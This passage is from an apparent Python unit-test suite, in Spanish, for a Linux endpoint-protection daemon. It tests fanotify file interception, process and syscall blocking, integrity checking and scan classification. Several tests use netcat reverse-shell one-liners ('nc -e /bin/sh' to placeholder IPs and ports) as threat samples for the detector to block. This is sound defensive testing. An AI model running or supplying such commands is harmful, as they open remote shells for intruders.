        rej = controller.add_exclusion("/usr/bin")
        self.assertEqual(rej["status"], "ERROR")
        self.assertEqual(rej["code"], "PROHIBITED_DIRECTORY")

        # 11. Sección Diagnóstico
        diag_sec = controller.get_diagnostic_section()
        self.assertEqual(diag_sec["section"], "DIAGNÓSTICO")
        self.assertIn("score", diag_sec)
        self.assertIn("recommendations", diag_sec)

        # 12. Dashboard textual de ConstantineApp
        app = ConstantineApp()
        text_dash = app.render_text_dashboard()
        self.assertIn("PANEL DE CONTROL v5.4.7", text_dash)
        self.assertIn("1. INICIO", text_dash)
        self.assertIn("2. PROTECCIÓN", text_dash)
        self.assertIn("3. ANÁLISIS", text_dash)
        self.assertIn("4. CUARENTENA", text_dash)
        self.assertIn("5. HISTORIAL", text_dash)
        self.assertIn("6. ACTUALIZACIONES", text_dash)
        self.assertIn("7. CONFIGURACIÓN", text_dash)
        self.assertIn("8. DIAGNÓSTICO", text_dash)

    def test_compatibility_matrix_tiers_and_distros(self):
        """
        Verifica la Matriz Oficial de Compatibilidad:
        - Tier 1: Kernel >= 5.15 con BPF LSM en Ubuntu 22.04 / Debian 12 / Fedora 39
        - Tier 2: Kernel 5.10 sin BPF LSM (modo degradado / contención reactiva)
        - Tier 3: Kernel < 5.4 (incompatible / no soportado)
        """
        from core.engine.compatibility_matrix import (CompatibilityMatrix, TIER_1_OPTIMAL, TIER_2_DEGRADED, TIER_3_UNSUPPORTED)

        matrix = CompatibilityMatrix()

        # 1. Tier 1: Kernel moderno con BPF LSM
        with patch.object(matrix, "check_bpf_lsm_support", return_value=True):
            rep_t1 = matrix.evaluate_system(override_kernel="6.5.0-generic", override_distro_id="ubuntu", override_distro_ver="22.04")
            self.assertEqual(rep_t1["tier"], TIER_1_OPTIMAL)
            self.assertTrue(rep_t1["is_official_distro"])
            self.assertTrue(rep_t1["bpf_lsm_supported"])
            self.assertTrue(rep_t1["fanotify_supported"])

        # 2. Tier 2: Kernel sin BPF LSM (Degraded Fallback)
        with patch.object(matrix, "check_bpf_lsm_support", return_value=False):
            rep_t2 = matrix.evaluate_system(override_kernel="5.10.0-8-amd64", override_distro_id="debian", override_distro_ver="11")
            self.assertEqual(rep_t2["tier"], TIER_2_DEGRADED)
            self.assertFalse(rep_t2["bpf_lsm_supported"])
            self.assertTrue(rep_t2["fanotify_supported"])

        # 3. Tier 3: Kernel obsoleto (< 5.4)
        rep_t3 = matrix.evaluate_system(override_kernel="4.15.0-generic", override_distro_id="ubuntu", override_distro_ver="18.04")
        self.assertEqual(rep_t3["tier"], TIER_3_UNSUPPORTED)
        self.assertEqual(rep_t3["status"], "INCOMPATIBLE")
        self.assertGreaterEqual(len(rep_t3["missing_requirements"]), 1)

    def test_resilience_manager_maintenance_circuit_breaker_quarantine_rollback(self):
        """
        Verifica la arquitectura de recuperación ante fallos y resiliencia:
        1. Modo de mantenimiento: suspende intercepciones y permite paso libre (FAN_ALLOW).
        2. Disyuntor de emergencia (Circuit Breaker): evita bloqueos de archivos ante timeouts repetidos.
        3. Desactivación segura de módulos defectuosos (Safe Module Quarantine).
        4. Recuperación tras actualización fallida (Auto-Rollback).
        """
        from core.engine.resilience_manager import ResilienceManager
        from core.engine.auto_updater import AutoUpdater

        resilience = ResilienceManager(snapshot_dir=self.temp_dir.name)

        # 1. Modo de mantenimiento
        self.assertFalse(resilience.is_maintenance_mode_active())
        self.assertFalse(resilience.is_file_access_permitted_fast())

        resilience.enable_maintenance_mode(reason="Actualización de software por usuario")
        self.assertTrue(resilience.is_maintenance_mode_active())
        self.assertTrue(resilience.is_file_access_permitted_fast())

        resilience.disable_maintenance_mode()
        self.assertFalse(resilience.is_maintenance_mode_active())
        self.assertFalse(resilience.is_file_access_permitted_fast())

        # 2. Disyuntor de emergencia (Circuit Breaker para archivos)
        self.assertFalse(resilience.emergency_bypass_active)
        resilience.record_scan_timeout("/path/file1")
        resilience.record_scan_timeout("/path/file2")
        self.assertFalse(resilience.emergency_bypass_active)
        # 3er timeout consecutivo -> Se dispara el disyuntor de emergencia
        resilience.record_scan_timeout("/path/file3")
        self.assertTrue(resilience.emergency_bypass_active)
        self.assertTrue(resilience.is_file_access_permitted_fast(), "Debe permitir acceso inmediato para no congelar el sistema")

        # Restablecimiento de disyuntor
        resilience.reset_emergency_bypass()
        self.assertFalse(resilience.emergency_bypass_active)

        # 3. Aislamiento seguro de módulos defectuosos
        self.assertFalse(resilience.is_module_isolated("flaky_module"))
        resilience.record_module_failure("flaky_module", "Crash 1")
        resilience.record_module_failure("flaky_module", "Crash 2")
        self.assertFalse(resilience.is_module_isolated("flaky_module"))
        # 3er fallo consecutivo -> Aislamiento del módulo defectuoso
        just_isolated = resilience.record_module_failure("flaky_module", "Crash 3")
        self.assertTrue(just_isolated)
        self.assertTrue(resilience.is_module_isolated("flaky_module"))
        self.assertFalse(resilience.is_module_isolated("healthy_module"), "Otros módulos deben permanecer activos")

        resilience.reset_module_fault("flaky_module")
        self.assertFalse(resilience.is_module_isolated("flaky_module"))

        # 4. Recuperación tras actualización fallida con Auto-Rollback
        updater = AutoUpdater(root_dir=self.temp_dir.name, backup_dir=self.temp_dir.name)
        saved = updater.create_snapshot({"yara_rules": 15, "state": "STABLE"})
        self.assertTrue(saved)

        # Simular intento de actualización que falla la compilación
        def broken_validator():
            raise SyntaxError("Regla YARA malformada en la línea 45")

        result = updater.apply_update_safely({"yara_rules": 20, "state": "BROKEN"}, validator_func=broken_validator)
        self.assertEqual(result["status"], "ROLLBACK_APPLIED")
        self.assertFalse(result["success"])
        self.assertIn("rollback", result["rollback_status"].lower())

    def test_external_integrations_probing_and_requirements_transparency(self):
        """
        Verifica la transparencia arquitectónica de integraciones externas:
        1. requirements.txt existe, define dependencias obligatorias (cryptography, PyYAML)
           y diferencia dependencias opcionales de librerías vs servicios independientes del SO.
        2. Probing dinámico en adaptadores (Tetragon, Falco, Wazuh, osquery, MISP, Sigma, ClamAV):
           - No asumen que los servicios externos están instalados por defecto.
           - Si el demonio/binario no está en el SO, reportan modo STANDALONE_... con detalle claro.
        3. Scanner.get_engine_manifest() retorna el manifiesto verificado de motores.
        4. Demonio expone GET_INTEGRATIONS_STATUS a través de IPC.
        """
        req_path = os.path.join(ROOT_DIR, "requirements.txt")
        self.assertTrue(os.path.exists(req_path), "requirements.txt debe existir en la raíz del proyecto")
        with open(req_path, "r", encoding="utf-8") as f:
            req_content = f.read()
        self.assertIn("cryptography", req_content)
        self.assertIn("PyYAML", req_content)
        self.assertIn("pySigma", req_content)
        self.assertIn("pymisp", req_content)
        self.assertIn("osquery", req_content)
        self.assertIn("falco", req_content)
        self.assertIn("wazuh", req_content)
        self.assertIn("tetragon", req_content)

        from core.engine.tetragon_monitor import TetragonMonitor
        from core.engine.falco_monitor import FalcoMonitor
        from core.engine.wazuh_detector import WazuhDetector
        from core.engine.osquery_diagnostics import OSQueryDiagnostics
        from core.engine.misp_feed_manager import MISPFeedManager
        from core.engine.sigma_engine import SigmaEngine

        tetragon = TetragonMonitor()
        probe_tetra = tetragon.probe_integration()
        self.assertIn("mode", probe_tetra)
        self.assertIn("daemon_installed", probe_tetra)
        if not probe_tetra["daemon_running"]:
            self.assertEqual(probe_tetra["mode"], "STANDALONE_POLICY_EMULATOR")

        falco = FalcoMonitor()
        probe_falco = falco.probe_integration()
        self.assertIn("mode", probe_falco)
        if not probe_falco["daemon_running"]:
            self.assertEqual(probe_falco["mode"], "STANDALONE_RULE_MATCHER")

        wazuh = WazuhDetector()
        probe_wazuh = wazuh.probe_integration()
        self.assertIn("mode", probe_wazuh)
        if not probe_wazuh["agent_running"]:
            self.assertEqual(probe_wazuh["mode"], "STANDALONE_FIM_YARA_ENGINE")

        osq = OSQueryDiagnostics()
        probe_osq = osq.probe_integration()
        self.assertIn("mode", probe_osq)
        if not probe_osq["binary_installed"]:
            self.assertEqual(probe_osq["mode"], "STANDALONE_SQLITE_FACADE")

        misp = MISPFeedManager()
        probe_misp = misp.probe_integration()
        self.assertIn("mode", probe_misp)
        self.assertIn("library_installed", probe_misp)

        sigma = SigmaEngine()
        probe_sigma = sigma.probe_integration()
        self.assertIn("mode", probe_sigma)
        self.assertIn("library_installed", probe_sigma)

        scanner = Scanner()
        manifest = scanner.get_engine_manifest()
        self.assertIn("yarax", manifest)
        self.assertIn("clamav", manifest)
        self.assertIn("sigma", manifest)
        self.assertIn("heuristic", manifest)

        daemon = ConstantineDaemon(is_test=True)
        status, data, msg = daemon.dispatch_ipc_command("GET_INTEGRATIONS_STATUS", {})
        self.assertEqual(status, "OK")
        self.assertIn("tetragon", data)
        self.assertIn("falco", data)
        self.assertIn("wazuh", data)
        self.assertIn("osquery", data)
        self.assertIn("misp", data)
        self.assertIn("sigma", data)
        self.assertIn("clamav", data)

    def test_aide_integrity_checker_baseline_and_probing(self):
        """
        Verifica el Verificador de Integridad de Archivos Críticos basado en AIDE:
        1. Probing dinámico (NATIVE_AIDE_BINARY vs STANDALONE_BASELINE_ENGINE).
        2. Creación e inicialización de línea base criptográfica (SHA-256, permisos, tamaño).
        3. Verificación de estado íntegro (CLEAN).
        4. Detección de manipulaciones no autorizadas (INTEGRITY_VIOLATION, HASH_MISMATCH, eliminación).
        5. Comando IPC CHECK_AIDE_INTEGRITY en el demonio.
        """
        from core.engine.aide_integrity import AIDEIntegrityChecker

        aide_dir = tempfile.mkdtemp()
        baseline_file = os.path.join(aide_dir, "aide_baseline.json")

        critical_file = os.path.join(aide_dir, "critical_binary.bin")
        with open(critical_file, "wb") as f:
            f.write(b"ORIGINAL_SYSTEM_BINARY_CONTENT_V1")

        checker = AIDEIntegrityChecker(baseline_path=baseline_file, monitored_dirs=[aide_dir])

        # 1. Probing
        probe = checker.probe_integration()
        self.assertIn("mode", probe)
        self.assertIn("AIDE", probe["name"])

        # 2. Inicializar línea base
        init_res = checker.init_baseline(target_dirs=[aide_dir])
        self.assertEqual(init_res["status"], "INITIALIZED")
        self.assertGreaterEqual(init_res["files_indexed"], 1)
        self.assertTrue(os.path.exists(baseline_file))

        # 3. Verificación de integridad limpia
        clean_res = checker.check_integrity()
        self.assertEqual(clean_res["status"], "CLEAN")
        self.assertEqual(clean_res["violations_count"], 0)

        # 4. Simulación de manipulación hostil
        with open(critical_file, "wb") as f:
            f.write(b"TAMPERED_MALICIOUS_ROOTKIT_CODE")

        tamper_res = checker.check_integrity()
        self.assertEqual(tamper_res["status"], "INTEGRITY_VIOLATION")
        self.assertEqual(tamper_res["violations_count"], 1)
        self.assertIn("HASH_MISMATCH", tamper_res["modified"][0]["issues"])

        # 5. Despacho IPC en daemon
        daemon = ConstantineDaemon(is_test=True)
        status, data, msg = daemon.dispatch_ipc_command("CHECK_AIDE_INTEGRITY", {})
        self.assertEqual(status, "OK")
        self.assertIn("status", data)

        shutil.rmtree(aide_dir)

    def test_security_decision_engine_and_blocking_capabilities(self):
        """
        Verifica el Motor de Decisiones de Seguridad (SecurityDecisionEngine) y la matriz de bloqueo real:
        1. Bloqueo de Procesos (Tetragon + BPF LSM / SIGKILL Fallback):
           - Proceso sospechoso denegado.
           - Proceso legítimo permitido.
        2. Bloqueo Conductual (Falco - Complemento Opcional):
           - Alerta crítica -> Aislamiento de red (Firewall drop).
           - Posibilidad de desactivar/activar Falco como complemento.
        3. Bloqueo de Acceso a Archivos (Fanotify):
           - Archivo malicioso -> FAN_DENY + Cuarentena atómica en Baúl.
        4. Verificación de capacidades reales mediante IPC GET_BLOCKING_CAPABILITIES.
        """
        from core.engine.security_decision_engine import SecurityDecisionEngine

        vault = CryptographicVault(base_dir=self.temp_dir.name)
        firewall = FirewallManager()
        engine = SecurityDecisionEngine(vault=vault, firewall=firewall)

        # 1. Tetragon / Proceso Malicioso
        tetragon = TetragonMonitor()
        dec_proc = engine.evaluate_process_execution(105, "/bin/nc", ["-e", "/bin/sh", "1.2.3.4", "4444"], tetragon_monitor=tetragon)
        self.assertTrue(dec_proc.is_blocked)
        self.assertIn("TETRAGON", dec_proc.primary_engine)
        self.assertIn(dec_proc.enforcement_action, ("BPF_LSM_EPERM", "SIGKILL_CONTAINMENT"))

        # Proceso Limpio
        dec_clean = engine.evaluate_process_execution(106, "/usr/bin/curl", ["https://example.com"], tetragon_monitor=tetragon)
        self.assertFalse(dec_clean.is_blocked)
        self.assertEqual(dec_clean.enforcement_action, "ALLOW")

        # 2. Falco / Syscall Conductual
        falco = FalcoMonitor()
        dec_falco = engine.evaluate_behavioral_syscall({
            "proc": "nc -e /bin/bash 192.168.1.50 9001",
            "fd": "3",
            "pid": 7722,
            "dport": 9001
        }, falco_monitor=falco)
        self.assertTrue(dec_falco.is_blocked)
        self.assertEqual(dec_falco.enforcement_action, "NETWORK_ISOLATE")
        self.assertTrue(dec_falco.network_isolated)

        # Desactivación opcional de Falco
        engine.set_falco_enabled(False)
        dec_falco_off = engine.evaluate_behavioral_syscall({"proc": "nc -e /bin/bash", "pid": 7722}, falco_monitor=falco)
        self.assertFalse(dec_falco_off.is_blocked)
        engine.set_falco_enabled(True)

        # 3. Fanotify / Acceso a Archivos
        scanner = Scanner()
        bad_path = os.path.join(self.temp_dir.name, "bad_script.sh")
        with open(bad_path, "w") as f:
            f.write("nc -e /bin/sh 10.0.0.1 4444")
        fd = os.open(bad_path, os.O_RDONLY)
        dec_file = engine.evaluate_file_access(bad_path, fd, pid=470, comm="test", scanner=scanner)
        os.close(fd)
        self.assertTrue(dec_file.is_blocked)
        self.assertEqual(dec_file.enforcement_action, "FANOTIFY_DENY")
        self.assertTrue(dec_file.quarantined)

        # Prueba de evaluate_file_access con FanotifyInterceptor integrado
        interceptor_for_engine = FanotifyInterceptor(vault=vault)
        bad_path_int = os.path.join(self.temp_dir.name, "bad_script_int.sh")
        with open(bad_path_int, "w") as f:
            f.write("nc -e /bin/sh 10.0.0.1 4444")
        fd_int = os.open(bad_path_int, os.O_RDONLY)
        dec_file_int = engine.evaluate_file_access(bad_path_int, fd_int, pid=470, comm="test", interceptor=interceptor_for_engine)
        os.close(fd_int)
        self.assertTrue(dec_file_int.is_blocked)
        self.assertEqual(dec_file_int.enforcement_action, "FANOTIFY_DENY")
        self.assertEqual(dec_file_int.primary_engine, "FANOTIFY")
        self.assertTrue(dec_file_int.quarantined)

        # 5. Integración de Seguridad Integral: osquery, AIDE, Sigma y MISP
        # 5a. osquery postura
        osq = OSQueryDiagnostics()
        dec_osq = engine.evaluate_system_posture(osq)
        self.assertFalse(dec_osq.is_blocked)
        self.assertEqual(dec_osq.primary_engine, "OSQUERY")

        # 5b. AIDE integridad
        aide_checker = AIDEIntegrityChecker(baseline_path=os.path.join(self.temp_dir.name, "decision_aide.json"))
        dec_aide = engine.evaluate_system_integrity(aide_checker)
        self.assertIn("AIDE", dec_aide.primary_engine)

        # 5c. Reglas Sigma conectadas en ejecución de proceso
        sigma_eng = SigmaEngine()
        dec_sigma = engine.evaluate_process_execution(999, "/usr/bin/visudo", ["/etc/sudoers"], sigma_engine=sigma_eng)
        self.assertTrue(dec_sigma.is_blocked)
        self.assertEqual(dec_sigma.primary_engine, "SIGMA")

        # 5d. MISP como fuente opcional de inteligencia
        misp_mgr = MISPFeedManager(intel_engine=scanner.intel)
        self.assertTrue(misp_mgr.enabled)
        misp_mgr.set_enabled(False)
        self.assertIsNone(misp_mgr.lookup_ioc("198.51.100.55"))
        misp_mgr.set_enabled(True)
        self.assertIsNotNone(misp_mgr.lookup_ioc("198.51.100.55"))

        # 4 & 5e. IPC GET_BLOCKING_CAPABILITIES y Comandos MISP en Demonio
        daemon = ConstantineDaemon(is_test=True)
        status, caps, msg = daemon.dispatch_ipc_command("GET_BLOCKING_CAPABILITIES", {})
        self.assertEqual(status, "OK")
        self.assertIn("filesystem_on_access", caps)
        self.assertEqual(caps["filesystem_on_access"]["capability"], "BLOCK_PREVENTIVE")
        self.assertIn("process_execution_enforcement", caps)
        self.assertIn("behavioral_syscall_enforcement", caps)
        self.assertIn("telemetry_tracepoints", caps)
        self.assertEqual(caps["telemetry_tracepoints"]["capability"], "OBSERVATION_ONLY")

        # Invariante estricto de capacidades verificadas (sin 'or True' falso positivo):
        import inspect
        src_caps = inspect.getsource(ConstantineDaemon.get_blocking_capabilities)
        self.assertNotIn("or True", src_caps)
        self.assertNotIn("or true", src_caps.lower())

        # Con el demonio no iniciado / sin descriptor en kernel, fanotify NO está verificado
        self.assertFalse(caps["filesystem_on_access"]["verified"])
        self.assertFalse(caps["process_execution_enforcement"]["verified"])
        self.assertFalse(caps["telemetry_tracepoints"]["verified"])

        # Al activar dinámicamente el interceptor, la capacidad se verifica de forma real y medible
        daemon.interceptor.running = True
        daemon.interceptor.fanotify_operational = True
        daemon.interceptor.fanotify_fd = 99
        self.assertTrue(daemon.interceptor.is_verified_operational())
        _, caps_active, _ = daemon.dispatch_ipc_command("GET_BLOCKING_CAPABILITIES", {})
        self.assertTrue(caps_active["filesystem_on_access"]["verified"])
        daemon.interceptor.running = False
        daemon.interceptor.fanotify_operational = False
        daemon.interceptor.fanotify_fd = None

        status_misp, data_misp, _ = daemon.dispatch_ipc_command("SET_MISP_ENABLED", {"enabled": False})
        self.assertEqual(status_misp, "OK")
        status_cfg, data_cfg, _ = daemon.dispatch_ipc_command("CONFIGURE_MISP_REMOTE", {"url": "https://misp.local", "api_key": "secret"})
        self.assertEqual(status_cfg, "OK")
        self.assertTrue(data_cfg["configured"])

    def test_fanotify_kernel_implementation_and_event_receptor_loop(self):
        """
        Verifica la implementación técnica nativa de fanotify en el kernel Linux:
        1. Vinculación nativa ctypes a fanotify_init(2) y fanotify_mark(2) en libc.
        2. Conformidad de estructuras fanotify_event_metadata (24 bytes) y fanotify_response (8 bytes).
        3. Inicialización controlada e identificación de privilegios (CAP_SYS_ADMIN).
        4. Registro de marcas en sistemas de archivos (mark_path / mark_default_mounts).
        5. Ciclo receptor de eventos de kernel en segundo plano con respuesta síncrona de permiso:
           - FAN_OPEN_PERM sobre archivo benigno -> FAN_ALLOW (0x01).
           - FAN_OPEN_PERM sobre archivo malicioso -> FAN_DENY (0x02) + Cuarentena en Baúl.
        6. Invariante estricto de reporte: fanotify_operational solo es True si el descriptor está activo.
        """
        import socket
        import ctypes
        from core.engine.interceptor import (
            FanotifyInterceptor, FanotifyEventMetadata, FanotifyResponse,
            FAN_OPEN_PERM, FAN_ALLOW, FAN_DENY, FANOTIFY_METADATA_VERSION
        )

        # 1. Comprobación de símbolos nativos en libc y dimensiones de estructuras C
        self.assertEqual(ctypes.sizeof(FanotifyEventMetadata), 24)
        self.assertEqual(ctypes.sizeof(FanotifyResponse), 8)

        # 2. Instanciación y comportamiento en entorno sin privilegios CAP_SYS_ADMIN
        vault = CryptographicVault(base_dir=self.temp_dir.name)
        interceptor = FanotifyInterceptor(vault=vault)
        # fanotify_init directo
        fd_init = interceptor.fanotify_init()
        # En contenedor no-root retorna -1 (EPERM)
        if os.getuid() != 0:
            self.assertEqual(fd_init, -1)
            self.assertFalse(interceptor.init_fanotify())
            self.assertFalse(interceptor.fanotify_operational)

        # 3. Comprobación de mark_path con ruta inexistente o sin fd
        self.assertFalse(interceptor.mark_path("/nonexistent/mount_path_xyz"))

        # 4. Verificación del ciclo receptor en segundo plano y protocolo de permiso vía socketpair
        s_worker, s_kernel = socket.socketpair(socket.AF_UNIX, socket.SOCK_STREAM)
        test_interceptor = FanotifyInterceptor(vault=vault)
        test_interceptor.start_listening(mock_fd=s_worker.fileno())
        self.assertTrue(test_interceptor.running)
        self.assertTrue(test_interceptor.fanotify_operational)
        self.assertEqual(test_interceptor.state, "ACTIVE")

        # 4a. Envío de evento FAN_OPEN_PERM sobre binario limpio
        clean_path = "/bin/ls"
        clean_fd = os.open(clean_path, os.O_RDONLY)
        meta_clean = FanotifyEventMetadata(
            event_len=ctypes.sizeof(FanotifyEventMetadata),
            vers=FANOTIFY_METADATA_VERSION,
            reserved=0,
            metadata_len=ctypes.sizeof(FanotifyEventMetadata),
            mask=FAN_OPEN_PERM,
            fd=clean_fd,
            pid=os.getpid()
        )
        s_kernel.sendall(bytes(meta_clean))

        # Lectura de la respuesta enviada por el hilo receptor
        resp_data = s_kernel.recv(ctypes.sizeof(FanotifyResponse))
        resp_clean = FanotifyResponse.from_buffer_copy(resp_data)
        self.assertEqual(resp_clean.response, FAN_ALLOW)
        self.assertEqual(resp_clean.fd, clean_fd)

        # 4b. Envío de evento FAN_OPEN_PERM sobre archivo malicioso
        bad_file = os.path.join(self.temp_dir.name, "fanotify_threat.sh")
        with open(bad_file, "w") as f:
            f.write("nc -e /bin/sh 1.2.3.4 9999")
        threat_fd = os.open(bad_file, os.O_RDONLY)

        meta_threat = FanotifyEventMetadata(
            event_len=ctypes.sizeof(FanotifyEventMetadata),
            vers=FANOTIFY_METADATA_VERSION,
            reserved=0,
            metadata_len=ctypes.sizeof(FanotifyEventMetadata),
            mask=FAN_OPEN_PERM,
            fd=threat_fd,
            pid=os.getpid()
        )
        s_kernel.sendall(bytes(meta_threat))

        resp_data_threat = s_kernel.recv(ctypes.sizeof(FanotifyResponse))
        resp_threat = FanotifyResponse.from_buffer_copy(resp_data_threat)
        self.assertEqual(resp_threat.response, FAN_DENY)
        self.assertEqual(resp_threat.fd, threat_fd)

        # 4c. Verificación de estadísticas y parada limpia
        status_info = test_interceptor.get_status()
        self.assertEqual(status_info["events_processed"], 2)
        self.assertEqual(status_info["events_allowed"], 1)
        self.assertEqual(status_info["events_denied"], 1)

        test_interceptor.stop()
        self.assertFalse(test_interceptor.running)
        self.assertFalse(test_interceptor.fanotify_operational)
        self.assertEqual(test_interceptor.state, "STOPPED")
        try:
            s_worker.close()
        except OSError:
            pass
        try:
            s_kernel.close()
        except OSError:
            pass


    # 126. Clasificación Tripartita del Motor de Escaneo (CLEAN, THREAT, INDETERMINATE)
    def test_scanner_tripartite_classification_clean_threat_indeterminate(self):
        """
        Verifica la clasificación tripartita estricta:
        1. CLEAN: Archivo analizado y verificado libre de malware.
        2. THREAT: Archivo analizado con firma o anomalía confirmada.
        3. INDETERMINATE: Archivo que no pudo analizarse (IO_ERROR o ENGINE_ERROR),
           garantizando que nunca sea clasificado como limpio por error.
        """
        scanner = Scanner()

        # 1. Caso Limpio
        clean_file = os.path.join(self.temp_dir.name, "tripartite_clean.txt")
        with open(clean_file, "w") as f:
            f.write("Texto completamente legítimo y sin código ejecutable.")
        rep_clean = scanner.scan_file(clean_file)
        self.assertEqual(rep_clean.status, ScanStatus.CLEAN)
        self.assertTrue(rep_clean.is_clean)
        self.assertFalse(rep_clean.is_threat)
        self.assertFalse(rep_clean.is_indeterminate)
        self.assertEqual(rep_clean.category, "BENIGN")

        # 2. Caso Amenaza
        threat_file = os.path.join(self.temp_dir.name, "tripartite_threat.sh")
        with open(threat_file, "w") as f:
            f.write("nc -e /bin/sh 10.0.0.1 4444")
        rep_threat = scanner.scan_file(threat_file)
        self.assertEqual(rep_threat.status, ScanStatus.THREAT)
        self.assertFalse(rep_threat.is_clean)
        self.assertTrue(rep_threat.is_threat)
        self.assertFalse(rep_threat.is_indeterminate)

        # 3. Caso Indeterminado por fallo de lectura / inexistente (IO_ERROR)
        rep_missing = scanner.scan_file(os.path.join(self.temp_dir.name, "non_existent_file.bin"))
        self.assertEqual(rep_missing.status, ScanStatus.INDETERMINATE)
        self.assertFalse(rep_missing.is_clean)
        self.assertIsNone(rep_missing.is_threat)
        self.assertTrue(rep_missing.is_indeterminate)
        self.assertEqual(rep_missing.category, "IO_ERROR")
        self.assertIn("No se pudo leer archivo", rep_missing.details)

        # 4. Caso Indeterminado por fallo interno de motor (ENGINE_ERROR)
        with patch.object(scanner.yarax, "scan_data", side_effect=RuntimeError("Fallo interno de memoria simulado")):
            rep_crash = scanner.scan_file(clean_file)
            self.assertEqual(rep_crash.status, ScanStatus.INDETERMINATE)
            self.assertFalse(rep_crash.is_clean)
            self.assertIsNone(rep_crash.is_threat)
            self.assertTrue(rep_crash.is_indeterminate)
            self.assertEqual(rep_crash.category, "ENGINE_ERROR")

    # 127. Interceptor y Motor de Decisiones: Análisis Indeterminado Aplica Fail-Secure
    def test_interceptor_and_security_decision_indeterminate_fail_secure(self):
        """
        Garantiza que un archivo cuyo análisis es INDETERMINATE nunca atraviese la protección
        sin una decisión explícita de seguridad, aplicando la política fail-closed / fail-open.
        """
        vault = CryptographicVault(base_dir=self.temp_dir.name)

        # 1. Interceptor en fail-closed (por defecto): Deniega acceso a archivos no analizables
        interceptor_closed = FanotifyInterceptor(vault=vault, fail_policy="fail-closed")
        missing_path = os.path.join(self.temp_dir.name, "corrupt_or_locked.bin")
        with open(missing_path, "w") as f:
            f.write("locked content")
        fd = os.open(missing_path, os.O_RDONLY)

        # Simulamos que el escáner devuelve resultado indeterminado (p.ej. fallo de descriptor)
        indet_report = ScanReport(
            is_threat=None,
            threat_name="INDETERMINATE",
            score=0,
            engine="IO_Subsystem",
            details="Lectura bloqueada por I/O error",
            severity="HIGH",
            category="IO_ERROR",
            sha256="",
            status=ScanStatus.INDETERMINATE
        )
        with patch.object(interceptor_closed.scanner, "scan_file", return_value=indet_report):
            dec_closed = interceptor_closed.evaluate_access(fd, missing_path, pid=470)
            self.assertEqual(dec_closed, 0x02)  # FAN_DENY: No permite atravesar la protección

        # 2. Interceptor en fail-open: Permite con advertencia
        interceptor_open = FanotifyInterceptor(vault=vault, fail_policy="fail-open")
        with patch.object(interceptor_open.scanner, "scan_file", return_value=indet_report):
            dec_open = interceptor_open.evaluate_access(fd, missing_path, pid=470)
            self.assertEqual(dec_open, 0x01)  # FAN_ALLOW

        os.close(fd)

        # 3. SecurityDecisionEngine: Clasifica explícitamente INDETERMINATE como bloqueo INDETERMINATE_DENY
        engine = SecurityDecisionEngine(vault=vault)
        with patch.object(interceptor_closed.scanner, "scan_file", return_value=indet_report):
            dec_engine = engine.evaluate_file_access(missing_path, 999, pid=470, scanner=interceptor_closed.scanner)
            self.assertTrue(dec_engine.is_blocked)
            self.assertEqual(dec_engine.enforcement_action, "INDETERMINATE_DENY")
            self.assertEqual(dec_engine.threat_level, "HIGH")
            self.assertIn("Análisis indeterminado", dec_engine.reason)

    # 128. Centinela de Descargas Rechaza Archivos Indeterminados
    def test_download_sentinel_rejects_indeterminate_files(self):
        """
        Verifica que el centinela de descargas no autorice una descarga si su análisis
        es indeterminado, evitando que amenazas no verificadas queden marcadas como limpias.
        """
        ds = DownloadSentinel()
        unreadable_file = os.path.join(self.temp_dir.name, "ghost_download.pkg")
        # El archivo no existe, por lo que el escáner produce INDETERMINATE (IO_ERROR)
        allowed = ds.handle_download_complete(unreadable_file, username="tester")
        self.assertFalse(allowed, "El centinela no debe autorizar descargas indeterminadas como limpias")


    # 129. Demonio IPC: SCAN_FILE y SCAN_DIRECTORY con Resultados Tripartitos
    def test_daemon_ipc_scan_file_and_directory_tripartite_results(self):
        """
        Verifica que los comandos IPC SCAN_FILE y SCAN_DIRECTORY del demonio
        entreguen el resultado tripartito y no clasifiquen errores de lectura como archivos limpios.
        """
        from daemon import ConstantineDaemon
        daemon = ConstantineDaemon(is_test=True)

        # 1. SCAN_FILE con archivo limpio
        clean_path = os.path.join(self.temp_dir.name, "ipc_clean.txt")
        with open(clean_path, "w") as f: f.write("seguro")
        status, data, msg = daemon.dispatch_ipc_command("SCAN_FILE", {"path": clean_path}, 1000)
        self.assertEqual(status, "OK")
        self.assertEqual(data["status"], "CLEAN")
        self.assertTrue(data["is_clean"])
        self.assertFalse(data["is_threat"])
        self.assertFalse(data["is_indeterminate"])

        # 2. SCAN_FILE con archivo inexistente / error E/S
        status, data, msg = daemon.dispatch_ipc_command("SCAN_FILE", {"path": "/missing/file.bin"}, 1000)
        self.assertEqual(status, "OK")
        self.assertEqual(data["status"], "INDETERMINATE")
        self.assertFalse(data["is_clean"])
        self.assertTrue(data["is_indeterminate"])
        self.assertEqual(data["category"], "IO_ERROR")

        # 3. SCAN_DIRECTORY con mezcla de limpio y unreadable
        scan_dir = os.path.join(self.temp_dir.name, "ipc_scan_dir")
        os.makedirs(scan_dir, exist_ok=True)
        with open(os.path.join(scan_dir, "f1.txt"), "w") as f: f.write("clean 1")
        unreadable = os.path.join(scan_dir, "unreadable.bin")
        with open(unreadable, "w") as f: f.write("secret")
        os.chmod(unreadable, 0o000) # Sin permisos de lectura

        status, data, msg = daemon.dispatch_ipc_command("SCAN_DIRECTORY", {"path": scan_dir}, 1000)
        os.chmod(unreadable, 0o644)
        self.assertEqual(status, "OK")
        self.assertEqual(data["scanned_count"], 2)
        self.assertEqual(data["indeterminates_count"], 1)
        self.assertEqual(len(data["indeterminates"]), 1)
        self.assertEqual(data["indeterminates"][0]["path"], unreadable)


    # 130. Invariantes Formales de ScanStatus y Rechazo de Estados Contradictorios
    def test_scanner_formal_invariants_and_contradiction_rejection(self):
        """
        Verifica los invariantes formales matemáticos del modelo de estados:
        - CLEAN nunca puede tener is_threat=True.
        - THREAT nunca puede tener is_clean=True ni is_threat=False.
        - INDETERMINATE nunca puede tener is_clean=True ni is_threat=False ni is_threat=True.
        - Ningún resultado incompleto (IO_ERROR, ENGINE_ERROR, TIMEOUT) puede convertirse en CLEAN.
        - Los estados contradictorios se rechazan tajantemente mediante ValueError.
        - El estado principal es un único campo tipado (ScanStatus) y los indicadores secundarios
          se derivan dinámicamente de él como propiedades puras.
        """
        # 1. CLEAN válido: derivación automática de propiedades
        rep_clean = ScanReport(status=ScanStatus.CLEAN, threat_name="CLEAN", category="BENIGN")
        self.assertIs(rep_clean.status, ScanStatus.CLEAN)
        self.assertIs(rep_clean.is_clean, True)
        self.assertIs(rep_clean.is_threat, False)
        self.assertIs(rep_clean.is_indeterminate, False)

        # 2. THREAT válido: derivación automática de propiedades
